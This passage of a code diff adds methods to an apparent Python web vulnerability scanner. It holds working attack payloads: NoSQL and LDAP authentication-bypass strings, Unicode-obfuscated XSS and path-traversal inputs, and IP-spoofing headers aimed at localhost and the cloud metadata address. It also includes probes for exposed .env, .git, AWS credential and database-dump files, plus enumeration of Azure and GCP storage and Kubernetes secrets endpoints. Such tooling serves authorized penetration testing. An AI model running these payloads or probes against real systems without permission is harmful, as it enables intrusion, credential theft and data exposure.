+                        'reason': f"Service: {result_data['service']} | {result_data['fingerprint'][:40]}",
+                        'severity': severity,
+                        'category': 'SUBDOMAIN_TAKEOVER',
+                        'details': result_data
+                    }
+                    results.append(result)
+                    print(f"  [✓] Takeover: {result_data['subdomain']} ({result_data['service']})")
+        
+        return results
+    
+    def _test_security_headers(self) -> List[Dict[str, Any]]:
+        """Audit security headers for misconfigurations"""
+        results = []
+        print("  [*] Auditing security headers...")
+        
+        try:
+            resp = safe_request(self.target, timeout=self.timeout, allow_redirects=True)
+            if not resp:
+                return results
+            
+            headers_lower = {k.lower(): v for k, v in resp.headers.items()}
+            
+            # Required security headers
+            security_headers = {
+                'strict-transport-security': {
+                    'name': 'HSTS',
+                    'severity': 'MEDIUM',
+                    'recommendation': 'Add Strict-Transport-Security header'
+                },
+                'content-security-policy': {
+                    'name': 'CSP',
+                    'severity': 'MEDIUM',
+                    'recommendation': 'Implement Content-Security-Policy'
+                },
+                'x-content-type-options': {
+                    'name': 'X-Content-Type-Options',
+                    'severity': 'LOW',
+                    'recommendation': 'Add X-Content-Type-Options: nosniff'
+                },
+                'x-frame-options': {
+                    'name': 'X-Frame-Options',
+                    'severity': 'MEDIUM',
+                    'recommendation': 'Add X-Frame-Options: DENY or SAMEORIGIN'
+                },
+                'x-xss-protection': {
+                    'name': 'X-XSS-Protection',
+                    'severity': 'LOW',
+                    'recommendation': 'Consider X-XSS-Protection (legacy browsers)'
+                },
+                'referrer-policy': {
+                    'name': 'Referrer-Policy',
+                    'severity': 'LOW',
+                    'recommendation': 'Add Referrer-Policy header'
+                },
+                'permissions-policy': {
+                    'name': 'Permissions-Policy',
+                    'severity': 'LOW',
+                    'recommendation': 'Implement Permissions-Policy'
+                },
+                'cross-origin-opener-policy': {
+                    'name': 'COOP',
+                    'severity': 'LOW',
+                    'recommendation': 'Consider Cross-Origin-Opener-Policy'
+                },
+                'cross-origin-resource-policy': {
+                    'name': 'CORP',
+                    'severity': 'LOW',
+                    'recommendation': 'Consider Cross-Origin-Resource-Policy'
+                },
+                'cross-origin-embedder-policy': {
+                    'name': 'COEP',
+                    'severity': 'LOW',
+                    'recommendation': 'Consider Cross-Origin-Embedder-Policy'
+                },
+            }
+            
+            missing_headers = []
+            present_headers = []
+            
+            for header, info in security_headers.items():
+                if header not in headers_lower:
+                    missing_headers.append(info)
+                else:
+                    present_headers.append({**info, 'value': headers_lower[header]})
+            
+            # Check for dangerous headers
+            dangerous_headers = {
+                'server': 'Server version disclosure',
+                'x-powered-by': 'Technology disclosure',
+                'x-aspnet-version': 'ASP.NET version disclosure',
+                'x-aspnetmvc-version': 'ASP.NET MVC version disclosure',
+            }
+            
+            for header, description in dangerous_headers.items():
+                if header in headers_lower:
+                    result = {
+                        'technique': f'Security Header: {description}',
+                        'bypass': False,
+                        'status': resp.status_code,
+                        'reason': f'{header}: {headers_lower[header]}',
+                        'severity': 'LOW',
+                        'category': 'SECURITY_HEADERS'
+                    }
+                    results.append(result)
+                    print(f"  [!] Info Disclosure: {header} = {headers_lower[header]}")
+            
+            # Report missing headers
+            for info in missing_headers:
+                result = {
+                    'technique': f"Missing Header: {info['name']}",
+                    'bypass': False,
+                    'status': resp.status_code,
+                    'reason': info['recommendation'],
+                    'severity': info['severity'],
+                    'category': 'SECURITY_HEADERS'
+                }
+                results.append(result)
+            
+            # Check CSP quality if present
+            if 'content-security-policy' in headers_lower:
+                csp = headers_lower['content-security-policy']
+                csp_issues = []
+                
+                if 'unsafe-inline' in csp:
+                    csp_issues.append("'unsafe-inline' allows inline scripts")
+                if 'unsafe-eval' in csp:
+                    csp_issues.append("'unsafe-eval' allows eval()")
+                if '*' in csp and 'script-src' in csp:
+                    csp_issues.append("Wildcard in script-src")
+                if 'data:' in csp:
+                    csp_issues.append("data: URI scheme allowed")
+                
+                for issue in csp_issues:
+                    result = {
+                        'technique': f'Weak CSP: {issue}',
+                        'bypass': True,
+                        'status': resp.status_code,
+                        'reason': issue,
+                        'severity': 'MEDIUM',
+                        'category': 'SECURITY_HEADERS'
+                    }
+                    results.append(result)
+                    print(f"  [!] Weak CSP: {issue}")
+            
+            print(f"  [*] Missing {len(missing_headers)} security headers")
+            
+        except Exception as e:
+            logger.debug(f"Security header audit error: {e}")
+        
+        return results
+    
+    def _test_cookie_security(self) -> List[Dict[str, Any]]:
+        """Test cookie security flags"""
+        results = []
+        print("  [*] Testing cookie security...")
+        
+        try:
+            resp = safe_request(self.target, timeout=self.timeout, allow_redirects=True)
+            if not resp:
+                return results
+            
+            # Parse Set-Cookie headers
+            set_cookies = resp.headers.get('Set-Cookie', '')
+            if not set_cookies:
+                cookies_raw = resp.raw.headers.getlist('Set-Cookie') if hasattr(resp.raw, 'headers') else []
+            else:
+                cookies_raw = [set_cookies] if isinstance(set_cookies, str) else list(set_cookies)
+            
+            for cookie_str in cookies_raw:
+                cookie_lower = cookie_str.lower()
+                cookie_name = cookie_str.split('=')[0].strip() if '=' in cookie_str else 'unknown'
+                
+                issues = []
+                
+                # Check for missing flags
+                if 'httponly' not in cookie_lower:
+                    issues.append('Missing HttpOnly flag')
+                
+                if 'secure' not in cookie_lower and self.target.startswith('https'):
+                    issues.append('Missing Secure flag')
+                
+                if 'samesite' not in cookie_lower:
+                    issues.append('Missing SameSite attribute')
+                elif 'samesite=none' in cookie_lower and 'secure' not in cookie_lower:
+                    issues.append('SameSite=None without Secure flag')
+                
+                # Check for sensitive cookies
+                sensitive_patterns = ['session', 'token', 'auth', 'jwt', 'api_key', 'csrf', 'xsrf']
+                is_sensitive = any(p in cookie_name.lower() for p in sensitive_patterns)
+                
+                if issues:
+                    severity = 'HIGH' if is_sensitive and 'HttpOnly' in str(issues) else 'MEDIUM' if is_sensitive else 'LOW'
+                    result = {
+                        'technique': f'Insecure Cookie: {cookie_name}',
+                        'bypass': is_sensitive,
+                        'status': resp.status_code,
+                        'reason': '; '.join(issues),
+                        'severity': severity,
+                        'category': 'COOKIE_SECURITY',
+                        'details': {'cookie': cookie_name, 'issues': issues}
+                    }
+                    results.append(result)
+                    print(f"  [!] Cookie {cookie_name}: {', '.join(issues)}")
+                    
+        except Exception as e:
+            logger.debug(f"Cookie security test error: {e}")
+        
+        return results
+    
+    def _test_information_disclosure(self) -> List[Dict[str, Any]]:
+        """Test for sensitive information disclosure"""
+        results = []
+        print("  [*] Testing information disclosure...")
+        
+        disclosure_paths = [
+            # Version control
+            ('/.git/config', 'Git config', 'CRITICAL'),
+            ('/.git/HEAD', 'Git HEAD', 'CRITICAL'),
+            ('/.svn/entries', 'SVN entries', 'CRITICAL'),
+            ('/.hg/hgrc', 'Mercurial config', 'CRITICAL'),
+            ('/.bzr/README', 'Bazaar repo', 'HIGH'),
+            
+            # Environment/Config files
+            ('/.env', 'Environment file', 'CRITICAL'),
+            ('/.env.local', 'Local env file', 'CRITICAL'),
+            ('/.env.production', 'Production env', 'CRITICAL'),
+            ('/.env.backup', 'Env backup', 'CRITICAL'),
+            ('/config.php', 'PHP config', 'HIGH'),
+            ('/config.yml', 'YAML config', 'HIGH'),
+            ('/config.json', 'JSON config', 'HIGH'),
+            ('/settings.py', 'Django settings', 'HIGH'),
+            ('/web.config', 'IIS config', 'HIGH'),
+            ('/wp-config.php', 'WordPress config', 'CRITICAL'),
+            ('/wp-config.php.bak', 'WP config backup', 'CRITICAL'),
+            
+            # Debug/Admin endpoints
+            ('/phpinfo.php', 'PHP info', 'HIGH'),
+            ('/info.php', 'PHP info', 'HIGH'),
+            ('/test.php', 'Test file', 'MEDIUM'),
+            ('/debug', 'Debug endpoint', 'HIGH'),
+            ('/_debug', 'Debug endpoint', 'HIGH'),
+            ('/debug.log', 'Debug log', 'HIGH'),
+            ('/error.log', 'Error log', 'MEDIUM'),
+            ('/access.log', 'Access log', 'MEDIUM'),
+            
+            # Backups
+            ('/backup.sql', 'SQL backup', 'CRITICAL'),
+            ('/backup.zip', 'Backup archive', 'CRITICAL'),
+            ('/db.sql', 'Database dump', 'CRITICAL'),
+            ('/database.sql', 'Database dump', 'CRITICAL'),
+            ('/dump.sql', 'Database dump', 'CRITICAL'),
+            ('/.sql', 'SQL file', 'HIGH'),
+            
+            # Package managers
+            ('/package.json', 'NPM package', 'LOW'),
+            ('/package-lock.json', 'NPM lock', 'LOW'),
+            ('/composer.json', 'Composer', 'LOW'),
+            ('/composer.lock', 'Composer lock', 'LOW'),
+            ('/Gemfile', 'Ruby Gemfile', 'LOW'),
+            ('/requirements.txt', 'Python deps', 'LOW'),
+            ('/Pipfile', 'Pipenv', 'LOW'),
+            
+            # CI/CD
+            ('/.travis.yml', 'Travis CI', 'MEDIUM'),
+            ('/.gitlab-ci.yml', 'GitLab CI', 'MEDIUM'),
+            ('/.circleci/config.yml', 'CircleCI', 'MEDIUM'),
+            ('/Jenkinsfile', 'Jenkins', 'MEDIUM'),
+            ('/.github/workflows', 'GitHub Actions', 'LOW'),
+            
+            # Cloud configs
+            ('/.aws/credentials', 'AWS creds', 'CRITICAL'),
+            ('/.docker/config.json', 'Docker config', 'HIGH'),
+            ('/Dockerfile', 'Dockerfile', 'LOW'),
+            ('/docker-compose.yml', 'Docker compose', 'MEDIUM'),
+            
+            # Server status
+            ('/server-status', 'Apache status', 'MEDIUM'),
+            ('/nginx_status', 'Nginx status', 'MEDIUM'),
+            ('/status', 'Status page', 'LOW'),
+            ('/health', 'Health check', 'INFO'),
+            ('/healthz', 'K8s health', 'INFO'),
+            ('/metrics', 'Metrics endpoint', 'MEDIUM'),
+            
+            # API docs
+            ('/swagger.json', 'Swagger spec', 'LOW'),
+            ('/openapi.json', 'OpenAPI spec', 'LOW'),
+            ('/api-docs', 'API docs', 'LOW'),
+            ('/graphql', 'GraphQL endpoint', 'LOW'),
+            
+            # Admin panels
+            ('/admin', 'Admin panel', 'MEDIUM'),
+            ('/administrator', 'Admin panel', 'MEDIUM'),
+            ('/wp-admin', 'WordPress admin', 'LOW'),
+            ('/phpmyadmin', 'phpMyAdmin', 'HIGH'),
+            ('/adminer.php', 'Adminer', 'HIGH'),
+        ]
+        
+        def check_path(path_info):
+            path, name, severity = path_info
+            try:
+                resp = safe_request(
+                    f"{self.target}{path}",
+                    timeout=self.timeout,
+                    allow_redirects=False
+                )
+                
+                if resp and resp.status_code == 200:
+                    # Check if it's actually content (not a generic 200 page)
+                    content_len = len(resp.content)
+                    if content_len > 0 and content_len != self._baseline_size:
+                        # Additional verification for specific file types
+                        content = resp.text[:500].lower()
+                        
+                        verified = False
+                        if '.git' in path and ('ref:' in content or '[core]' in content):
+                            verified = True
+                        elif '.env' in path and ('=' in content or 'password' in content or 'key' in content):
+                            verified = True
+                        elif '.sql' in path and ('insert' in content or 'create table' in content):
+                            verified = True
+                        elif 'phpinfo' in path and ('php version' in content or 'configuration' in content):
+                            verified = True
+                        elif 'package.json' in path and ('"name"' in content or '"version"' in content):
+                            verified = True
+                        elif resp.status_code == 200 and content_len > 50:
+                            verified = True
+                        
+                        if verified:
+                            return {
+                                'path': path,
+                                'name': name,
+                                'severity': severity,
+                                'status': resp.status_code,
+                                'size': content_len
+                            }
+                            
+            except Exception as e:
+                logger.debug(f"Disclosure check error for {path}: {e}")
+            return None
+        
+        with ThreadPoolExecutor(max_workers=self.threads) as executor:
+            futures = {executor.submit(check_path, p): p for p in disclosure_paths}
+            
+            for future in as_completed(futures):
+                result_data = future.result()
+                if result_data:
+                    result = {
+                        'technique': f"Info Disclosure: {result_data['name']}",
+                        'bypass': True,
+                        'status': result_data['status'],
+                        'reason': f"Found at {result_data['path']} ({result_data['size']} bytes)",
+                        'severity': result_data['severity'],
+                        'category': 'INFO_DISCLOSURE',
+                        'details': result_data
+                    }
+                    results.append(result)
+                    print(f"  [✓] {result_data['severity']}: {result_data['name']} at {result_data['path']}")
+        
+        return results
+    
+    def _test_nosql_injection(self) -> List[Dict[str, Any]]:
+        """Test for NoSQL injection vulnerabilities"""
+        results = []
+        print("  [*] Testing NoSQL injection...")
+        
+        # MongoDB injection payloads
+        nosql_payloads = [
+            # Query operator injection
+            ('?username[$ne]=admin', 'MongoDB $ne'),
+            ('?username[$gt]=', 'MongoDB $gt'),
+            ('?username[$regex]=.*', 'MongoDB $regex'),
+            ('?password[$exists]=true', 'MongoDB $exists'),
+            ('?$where=1', 'MongoDB $where'),
+            ('?username=admin&password[$ne]=x', 'Auth bypass $ne'),
+            
+            # JSON body injection
+            ('{"username": {"$gt": ""}}', 'JSON $gt', True),
+            ('{"username": {"$ne": "invalid"}}', 'JSON $ne', True),
+            ('{"$or": [{"username": "admin"}, {"password": {"$ne": ""}}]}', 'JSON $or', True),
+            ('{"username": {"$regex": ".*"}}', 'JSON $regex', True),
+            ('{"$where": "this.password.length > 0"}', 'JSON $where', True),
+            
+            # Array injection
+            ('?filter[username]=admin', 'Array filter'),
+            ('?query[username][$gt]=', 'Query array'),
+        ]
+        
+        test_cases = []
+        for payload in nosql_payloads:
+            if len(payload) == 3 and payload[2]:  # JSON payload
+                continue  # Handle separately
+            test_cases.append({
+                'headers': {},
+                'path': payload[0],
+                'technique': f'NoSQL: {payload[1]}'
+            })
+        
+        batch_results = self._batch_test(test_cases)
+        
+        # Test JSON payloads
+        json_payloads = [p for p in nosql_payloads if len(p) == 3]
+        for payload_str, technique, _ in json_payloads:
+            try:
+                import json
+                payload = json.loads(payload_str)
+                resp = self._session.post(
+                    self.target,
+                    json=payload,
+                    timeout=self.timeout,
+                    verify=False
+                )
+                
+                if resp:
+                    # Check for successful injection indicators
+                    if resp.status_code == 200 and len(resp.content) != self._baseline_size:
+                        result = {
+                            'technique': f'NoSQL: {technique}',
+                            'bypass': True,
+                            'status': resp.status_code,
+                            'reason': 'Response differs from baseline - potential injection',
+                            'severity': 'HIGH',
+                            'category': 'NOSQL_INJECTION'
+                        }
+                        results.append(result)
+                        print(f"  [✓] NoSQL Injection: {technique}")
+                        
+            except Exception as e:
+                logger.debug(f"NoSQL JSON test error: {e}")
+        
+        for r in batch_results:
+            r['category'] = 'NOSQL_INJECTION'
+            results.append(r)
+        
+        return results
+    
+    def _test_ldap_injection(self) -> List[Dict[str, Any]]:
+        """Test for LDAP injection vulnerabilities"""
+        results = []
+        print("  [*] Testing LDAP injection...")
+        
+        ldap_payloads = [
+            # Basic LDAP injection
+            ('?user=*', 'Wildcard'),
+            ('?user=*)(uid=*))(|(uid=*', 'Filter injection'),
+            ('?user=admin)(|(password=*)', 'OR injection'),
+            ('?user=*))%00', 'Null byte'),
+            ('?user=admin)(&)', 'AND injection'),
+            ('?user=admin)(cn=*', 'CN injection'),
+            ('?user=*)(objectClass=*', 'ObjectClass enum'),
+            ('?user=admin)(!(&(1=0', 'NOT injection'),
+            
+            # Attribute extraction
+            ('?user=*)(userPassword=*', 'Password enum'),
+            ('?user=*)(mail=*', 'Email enum'),
+            ('?user=*)(telephoneNumber=*', 'Phone enum'),
+            
+            # Authentication bypass
+            ('?user=*))(&(uid=admin', 'Auth bypass'),
+            ('?user=admin)(%26)', 'Encoded AND'),
+        ]
+        
+        test_cases = [
+            {'headers': {}, 'path': path, 'technique': f'LDAP: {technique}'}
+            for path, technique in ldap_payloads
+        ]
+        
+        batch_results = self._batch_test(test_cases)
+        for r in batch_results:
+            r['category'] = 'LDAP_INJECTION'
+            results.append(r)
+        
+        return results
+    
+    def _test_unicode_normalization(self) -> List[Dict[str, Any]]:
+        """Test for Unicode normalization WAF bypasses"""
+        results = []
+        print("  [*] Testing Unicode normalization bypasses...")
+        
+        # Unicode homoglyphs and normalization attacks
+        unicode_payloads = [
+            # Homoglyphs for common characters
+            ('/?test=＜script＞alert(1)＜/script＞', 'Fullwidth XSS'),
+            ('/?test=\u003cscript\u003ealert(1)\u003c/script\u003e', 'Unicode escape XSS'),
+            ('/?test=\uff1cscript\uff1ealert(1)\uff1c/script\uff1e', 'Fullwidth brackets'),
+            
+            # Unicode normalization
+            ('/?test=%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE', 'Overlong UTF-8'),
+            ('/?test=\u2215etc\u2215passwd', 'Division slash traversal'),
+            ('/?test=..%c0%af..%c0%af', 'Overlong traversal'),
+            
+            # Case folding attacks
+            ('/?test=ſcript', 'Long S (ſ→s)'),
+            ('/?test=\u0131nput', 'Dotless i'),
+            ('/?test=\u212aeyword', 'Kelvin K'),
+            
+            # Combining characters
+            ('/?test=scr\u0307ipt', 'Combining dot'),
+            ('/?test=<\u200bscript\u200b>', 'Zero-width space'),
+            ('/?test=<\ufeffscript>', 'BOM injection'),
+            
+            # Right-to-left override
+            ('/?test=\u202escript\u202c', 'RTL override'),
+            
+            # Percent encoding with Unicode
+            ('/?test=%E2%80%AEtpircs%E2%80%AC', 'RTL encoded'),
+        ]
+        
+        test_cases = [
+            {'headers': {}, 'path': path, 'technique': technique}
+            for path, technique in unicode_payloads
+        ]
+        
+        batch_results = self._batch_test(test_cases)
+        for r in batch_results:
+            r['category'] = 'UNICODE_NORMALIZATION'
+            results.append(r)
+        
+        return results
+    
+    def _test_json_injection(self) -> List[Dict[str, Any]]:
+        """Test for JSON injection and parsing vulnerabilities"""
+        results = []
+        print("  [*] Testing JSON injection...")
+        
+        json_payloads = [
+            # Duplicate keys (parser-dependent)
+            ('{"user":"admin","user":"guest"}', 'Duplicate keys'),
+            # Unicode escapes
+            ('{"user":"\\u0061\\u0064\\u006d\\u0069\\u006e"}', 'Unicode escape'),
+            # Comments (non-standard)
+            ('{"user":"admin"/*comment*/}', 'JSON comment'),
+            # Trailing data
+            ('{"user":"admin"}extra', 'Trailing data'),
+            # Scientific notation
+            ('{"id":1e308}', 'Scientific notation overflow'),
+            # Deep nesting
+            ('{"a":' * 100 + '1' + '}' * 100, 'Deep nesting'),
+            # Special values
+            ('{"value":NaN}', 'NaN value'),
+            ('{"value":Infinity}', 'Infinity value'),
+            # Null byte
+            ('{"user":"admin\\u0000"}', 'Null byte in value'),
+        ]
+        
+        for payload, technique in json_payloads:
+            try:
+                resp = self._session.post(
+                    self.target,
+                    data=payload,
+                    headers={'Content-Type': 'application/json'},
+                    timeout=self.timeout,
+                    verify=False
+                )
+                
+                if resp and resp.status_code not in [400, 415]:
+                    result = {
+                        'technique': f'JSON: {technique}',
+                        'bypass': resp.status_code == 200,
+                        'status': resp.status_code,
+                        'reason': f'Server accepted malformed JSON',
+                        'severity': 'MEDIUM' if resp.status_code == 200 else 'LOW',
+                        'category': 'JSON_INJECTION'
+                    }
+                    results.append(result)
+                    if resp.status_code == 200:
+                        print(f"  [!] JSON accepted: {technique}")
+                        
+            except Exception as e:
+                logger.debug(f"JSON injection test error: {e}")
+        
+        return results
+    
+    def _test_ip_spoofing_headers(self) -> List[Dict[str, Any]]:
+        """Extended IP spoofing via various headers"""
+        results = []
+        print("  [*] Testing extended IP spoofing headers...")
+        
+        # Extended list of IP headers
+        ip_headers = [
+            'X-Forwarded-For',
+            'X-Real-IP',
+            'X-Client-IP',
+            'X-Originating-IP',
+            'X-Remote-IP',
+            'X-Remote-Addr',
+            'CF-Connecting-IP',  # Cloudflare
+            'True-Client-IP',    # Akamai
+            'X-Cluster-Client-IP',
+            'X-ProxyUser-Ip',
+            'Forwarded',
+            'Forwarded-For',
+            'X-Forwarded',
+            'Client-IP',
+            'Real-IP',
+            'Via',
+            'X-Custom-IP-Authorization',
+        ]
+        
+        # Test IPs
+        test_ips = [
+            '127.0.0.1',
+            '10.0.0.1',
+            '192.168.1.1',
+            '172.16.0.1',
+            '169.254.169.254',
+            '::1',
+            '0.0.0.0',
+            'localhost',
+        ]
+        
+        test_cases = []
+        for header in ip_headers:
+            for ip in test_ips[:3]:  # Limit combinations
+                test_cases.append({
+                    'headers': {header: ip},
+                    'technique': f'{header}: {ip}'
+                })
+        
+        # Also test chained headers
+        test_cases.append({
+            'headers': {
+                'X-Forwarded-For': '127.0.0.1, 10.0.0.1',
+                'X-Real-IP': '127.0.0.1',
+                'X-Client-IP': '127.0.0.1'
+            },
+            'technique': 'Chained IP headers'
+        })
+        
+        batch_results = self._batch_test(test_cases)
+        for r in batch_results:
+            r['category'] = 'IP_SPOOFING'
+            results.append(r)
+        
+        return results
+
+    # ============================================================================
+    # CLOUD-SPECIFIC TESTS
+    # ============================================================================
+    
+    def _test_azure_blob_enumeration(self) -> List[Dict[str, Any]]:
+        """Test for misconfigured Azure Blob Storage"""
+        results = []
+        print("  [*] Testing Azure Blob Storage...")
+        
+        # Extract potential storage account names from domain
+        domain_parts = self.domain.replace('.', '-').split('-')
+        potential_accounts = [
+            self.domain.split('.')[0],
+            ''.join(domain_parts[:2]),
+            domain_parts[0] if domain_parts else 'storage',
+        ]
+        
+        container_names = [
+            'public', 'data', 'files', 'assets', 'images', 'uploads',
+            'backup', 'backups', 'logs', 'static', 'media', 'content',
+            'documents', 'downloads', 'temp', 'test', 'dev', 'prod'
+        ]
+        
+        def check_azure_blob(account: str, container: str) -> Optional[Dict]:
+            try:
+                url = f"https://{account}.blob.core.windows.net/{container}?restype=container&comp=list"
+                resp = safe_request(url, timeout=5)
+                
+                if resp and resp.status_code == 200:
+                    if 'EnumerationResults' in resp.text or '<Blob>' in resp.text:
+                        return {
+                            'account': account,
+                            'container': container,
+                            'url': url,
+                            'status': resp.status_code
+                        }
+            except:
+                pass
+            return None
+        
+        with ThreadPoolExecutor(max_workers=self.threads) as executor:
+            futures = []
+            for account in potential_accounts:
+                for container in container_names:
+                    futures.append(
+                        executor.submit(check_azure_blob, account, container)
+                    )
+            
+            for future in as_completed(futures):
+                result_data = future.result()
+                if result_data:
+                    result = {
+                        'technique': f"Azure Blob: {result_data['account']}/{result_data['container']}",
+                        'bypass': True,
+                        'status': result_data['status'],
+                        'reason': 'Public Azure Blob container found',
+                        'severity': 'HIGH',
+                        'category': 'CLOUD_STORAGE',
+                        'details': result_data
+                    }
+                    results.append(result)
+                    print(f"  [✓] Azure Blob: {result_data['account']}/{result_data['container']}")
+        
+        return results
+    
+    def _test_gcp_bucket_discovery(self) -> List[Dict[str, Any]]:
+        """Test for misconfigured GCP Storage buckets"""
+        results = []
+        print("  [*] Testing GCP Storage buckets...")
+        
+        # Generate potential bucket names
+        domain_parts = self.domain.split('.')
+        base_name = domain_parts[0] if domain_parts else 'bucket'
+        
+        bucket_patterns = [
+            base_name,
+            f"{base_name}-backup",
+            f"{base_name}-data",
+            f"{base_name}-dev",
+            f"{base_name}-prod",
+            f"{base_name}-staging",
+            f"{base_name}-assets",
+            f"{base_name}-public",
+            f"{base_name}-private",
+            f"{base_name}-uploads",
+            f"{base_name}-static",
+        ]
+        
+        def check_gcp_bucket(bucket: str) -> Optional[Dict]:
+            try:
+                # Try storage.googleapis.com
+                url = f"https://storage.googleapis.com/{bucket}"
+                resp = safe_request(url, timeout=5)
+                
+                if resp and resp.status_code in [200, 403]:
+                    if resp.status_code == 200:
+                        return {
+                            'bucket': bucket,
+                            'url': url,
+                            'status': resp.status_code,
+                            'accessible': True
+                        }
+                    elif 'AccessDenied' in resp.text:
+                        return {
+                            'bucket': bucket,
+                            'url': url,
+                            'status': resp.status_code,
+                            'accessible': False,
+                            'exists': True
+                        }
+            except:
+                pass
+            return None
+        
+        with ThreadPoolExecutor(max_workers=self.threads) as executor:
+            futures = {executor.submit(check_gcp_bucket, b): b for b in bucket_patterns}
+            
+            for future in as_completed(futures):
+                result_data = future.result()
+                if result_data:
+                    severity = 'HIGH' if result_data.get('accessible') else 'LOW'
+                    result = {
+                        'technique': f"GCP Bucket: {result_data['bucket']}",
+                        'bypass': result_data.get('accessible', False),
+                        'status': result_data['status'],
+                        'reason': 'Public GCP bucket' if result_data.get('accessible') else 'Bucket exists (access denied)',
+                        'severity': severity,
+                        'category': 'CLOUD_STORAGE',
+                        'details': result_data
+                    }
+                    results.append(result)
+                    if result_data.get('accessible'):
+                        print(f"  [✓] GCP Bucket: {result_data['bucket']} (public!)")
+        
+        return results
+    
+    def _test_serverless_functions(self) -> List[Dict[str, Any]]:
+        """Test for exposed serverless function endpoints"""
+        results = []
+        print("  [*] Testing serverless function endpoints...")
+        
+        # AWS Lambda function URL patterns
+        lambda_paths = [
+            '/.netlify/functions/',
+            '/api/',
+            '/.aws/',
+            '/prod/',
+            '/dev/',
+            '/stage/',
+            '/default/',
+        ]
+        
+        function_names = [
+            'handler', 'api', 'webhook', 'callback', 'process',
+            'auth', 'login', 'register', 'user', 'admin',
+            'data', 'upload', 'download', 'export', 'import',
+            'test', 'debug', 'health', 'status', 'info'
+        ]
+        
+        test_cases = []
+        for path in lambda_paths:
+            for func in function_names:
+                test_cases.append({
+                    'headers': {},
+                    'path': f"{path}{func}",
+                    'technique': f'Serverless: {path}{func}'
+                })
+        
+        # Also check for Vercel/Netlify patterns
+        vercel_paths = [
+            '/api/hello',
+            '/api/auth',
+            '/api/users',
+            '/api/data',
+            '/_next/data/',
+        ]
+        
+        for path in vercel_paths:
+            test_cases.append({
+                'headers': {},
+                'path': path,
+                'technique': f'Vercel/Next: {path}'
+            })
+        
+        batch_results = self._batch_test(test_cases, verbose=False)
+        
+        for r in batch_results:
+            if r.get('status') in [200, 201, 400, 401, 403]:
+                r['category'] = 'SERVERLESS'
+                results.append(r)
+                if r.get('bypass'):
+                    print(f"  [✓] Serverless endpoint: {r['technique']}")
+        
+        return results
+    
+    def _test_kubernetes_api(self) -> List[Dict[str, Any]]:
+        """Test for exposed Kubernetes API endpoints"""
+        results = []
+        print("  [*] Testing Kubernetes API exposure...")
+        
+        k8s_endpoints = [
+            # Standard K8s API paths
+            ('/api', 'K8s API root'),
+            ('/api/v1', 'K8s API v1'),
+            ('/apis', 'K8s APIs'),
+            ('/healthz', 'K8s health'),
+            ('/livez', 'K8s liveness'),
+            ('/readyz', 'K8s readiness'),
+            ('/version', 'K8s version'),
+            ('/metrics', 'K8s metrics'),
+            
+            # Namespace enumeration
+            ('/api/v1/namespaces', 'K8s namespaces'),
+            ('/api/v1/pods', 'K8s pods'),
+            ('/api/v1/services', 'K8s services'),
+            ('/api/v1/secrets', 'K8s secrets'),
+            ('/api/v1/configmaps', 'K8s configmaps'),
+            
+            # Dashboard
+            ('/dashboard/', 'K8s Dashboard'),
+            ('/kubernetes-dashboard/', 'K8s Dashboard alt'),
+            
+            # Helm/Tiller
+            ('/tiller/', 'Helm Tiller'),
+            
+            # ETCD
+            ('/v2/keys', 'etcd keys'),
+            ('/v3/kv/range', 'etcd v3'),
+        ]
+        
+        test_cases = [
+            {'headers': {}, 'path': path, 'technique': technique}
+            for path, technique in k8s_endpoints
+        ]
+        
+        # Also test with common K8s headers
+        test_cases.append({
+            'headers': {'Authorization': 'Bearer test'},
+            'path': '/api/v1/namespaces',
+            'technique': 'K8s with Bearer token'
+        })
+        
+        batch_results = self._batch_test(test_cases, verbose=False)
+        
+        for r in batch_results:
+            r['category'] = 'KUBERNETES'
+            # Check for K8s-specific responses
+            if r.get('status') in [200, 401, 403]:
+                results.append(r)
+                if r.get('status') == 200:
+                    print(f"  [✓] K8s endpoint exposed: {r['technique']}")
+                elif r.get('status') in [401, 403]:
+                    # K8s API exists but requires auth
+                    r['severity'] = 'MEDIUM'
+                    r['reason'] = 'K8s API exists (auth required)'
+                    results.append(r)
+        
+        return results
+    
+    def _test_cloud_provider_detection(self) -> List[Dict[str, Any]]:
+        """Enhanced cloud provider fingerprinting"""
+        results = []
+        print("  [*] Detecting cloud provider...")
+        
+        try:
+            resp = safe_request(self.target, timeout=self.timeout, allow_redirects=True)
+            if not resp:
+                return results
+            
+            headers_lower = {k.lower(): v.lower() for k, v in resp.headers.items()}
+            
+            cloud_indicators = {
+                'AWS': {
+                    'headers': ['x-amz-', 'x-amzn-', 'x-aws-'],
+                    'patterns': ['amazonaws.com', 'cloudfront.net', 'elasticbeanstalk'],
+                },
+                'Azure': {
+                    'headers': ['x-azure-', 'x-ms-'],
+                    'patterns': ['azurewebsites.net', 'azure.com', 'cloudapp.azure'],
+                },
+                'GCP': {
+                    'headers': ['x-goog-', 'x-cloud-'],
+                    'patterns': ['googleapis.com', 'appspot.com', 'cloudfunctions.net'],
+                },
+                'DigitalOcean': {
+                    'headers': ['x-do-'],
+                    'patterns': ['digitaloceanspaces.com', 'ondigitalocean.app'],
+                },
+                'Heroku': {
+                    'headers': ['x-heroku-'],
+                    'patterns': ['herokuapp.com', 'herokucdn.com'],
+                },
+                'Vercel': {
+                    'headers': ['x-vercel-'],
+                    'patterns': ['vercel.app', 'now.sh'],
+                },
+                'Netlify': {
+                    'headers': ['x-nf-'],
+                    'patterns': ['netlify.app', 'netlify.com'],
+                },
+                'Render': {
+                    'headers': [],
+                    'patterns': ['onrender.com', 'render.com'],
+                },
+                'Railway': {
+                    'headers': [],
+                    'patterns': ['railway.app'],
+                },
+                'Fly.io': {
+                    'headers': ['fly-'],
+                    'patterns': ['fly.dev', 'fly.io'],
+                },
+            }
+            
+            detected = []
+            for provider, indicators in cloud_indicators.items():
+                confidence = 0
+                matched = []
+                
+                # Check headers
+                for header_prefix in indicators['headers']:
+                    for h in headers_lower:
+                        if h.startswith(header_prefix):
+                            confidence += 40
+                            matched.append(f"Header: {h}")
+                
+                # Check URL/body patterns
+                for pattern in indicators['patterns']:
+                    if pattern in self.target.lower() or pattern in resp.text.lower():
+                        confidence += 50
+                        matched.append(f"Pattern: {pattern}")
+                
+                if confidence > 0:
+                    detected.append({
+                        'provider': provider,
+                        'confidence': min(confidence, 100),
+                        'indicators': matched
+                    })
+            
+            for d in detected:
+                result = {
+                    'technique': f"Cloud Provider: {d['provider']}",
+                    'bypass': False,
+                    'status': resp.status_code,
+                    'reason': f"Confidence: {d['confidence']}% - {', '.join(d['indicators'][:2])}",
+                    'severity': 'INFO',
+                    'category': 'CLOUD_DETECTION',
+                    'details': d
+                }
+                results.append(result)
